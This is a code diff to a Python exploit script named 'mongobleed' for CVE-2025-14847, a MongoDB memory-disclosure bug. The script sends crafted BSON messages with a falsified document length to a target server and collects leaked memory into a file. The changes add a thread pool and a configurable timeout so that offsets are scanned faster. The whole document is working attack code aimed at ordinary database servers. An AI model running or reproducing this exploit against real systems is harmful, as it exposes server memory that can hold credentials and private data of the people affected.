@@ -14,8 +14,15 @@ import struct
 import zlib
 import re
 import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
-def send_probe(host, port, doc_len, buffer_size):
+# Thread-safe storage
+leak_lock = threading.Lock()
+unique_leaks = set()
+all_leaked = bytearray()
+
+def send_probe(host, port, doc_len, buffer_size, timeout=2):
     """Send crafted BSON with inflated document length"""
     # Minimal BSON content - we lie about total length
     content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
@@ -35,7 +42,7 @@ def send_probe(host, port, doc_len, buffer_size):
     
     try:
         sock = socket.socket()
-        sock.settimeout(2)
+        sock.settimeout(timeout)
         sock.connect((host, port))
         sock.sendall(header + payload)
         
@@ -78,6 +85,12 @@ def extract_leaks(response):
     
     return leaks
 
+def probe_offset(host, port, doc_len, timeout):
+    """Probe a single offset and return results"""
+    response = send_probe(host, port, doc_len, doc_len + 500, timeout)
+    leaks = extract_leaks(response)
+    return doc_len, leaks
+
 def main():
     parser = argparse.ArgumentParser(description='CVE-2025-14847 MongoDB Memory Leak')
     parser.add_argument('--host', default='localhost', help='Target host')
@@ -85,30 +98,50 @@ def main():
     parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
     parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
     parser.add_argument('--output', default='leaked.bin', help='Output file')
+    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
+    parser.add_argument('--timeout', type=float, default=2, help='Socket timeout (default: 2)')
     args = parser.parse_args()
     
     print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
     print(f"[*] Author: Joe Desimone - x.com/dez_")
     print(f"[*] Target: {args.host}:{args.port}")
-    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
+    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset} with {args.threads} threads")
     print()
     
+    global all_leaked, unique_leaks
     all_leaked = bytearray()
     unique_leaks = set()
     
-    for doc_len in range(args.min_offset, args.max_offset):
-        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
-        leaks = extract_leaks(response)
+    offsets = range(args.min_offset, args.max_offset)
+    completed = 0
+    total = len(offsets)
+    
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = {
+            executor.submit(probe_offset, args.host, args.port, doc_len, args.timeout): doc_len 
+            for doc_len in offsets
+        }
         
-        for data in leaks:
-            if data not in unique_leaks:
-                unique_leaks.add(data)
-                all_leaked.extend(data)
-                
-                # Show interesting leaks (> 10 bytes)
-                if len(data) > 10:
-                    preview = data[:80].decode('utf-8', errors='replace')
-                    print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
+        for future in as_completed(futures):
+            completed += 1
+            doc_len, leaks = future.result()
+            
+            for data in leaks:
+                with leak_lock:
+                    if data not in unique_leaks:
+                        unique_leaks.add(data)
+                        all_leaked.extend(data)
+                        
+                        # Show interesting leaks (> 10 bytes)
+                        if len(data) > 10:
+                            preview = data[:80].decode('utf-8', errors='replace')
+                            print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
+            
+            # Progress update every 100
+            if completed % 100 == 0:
+                print(f"[*] Progress: {completed}/{total} ({100*completed//total}%)", end='\r')
+    
+    print(f"[*] Progress: {completed}/{total} (100%)    ")
     
     # Save results
     with open(args.output, 'wb') as f:
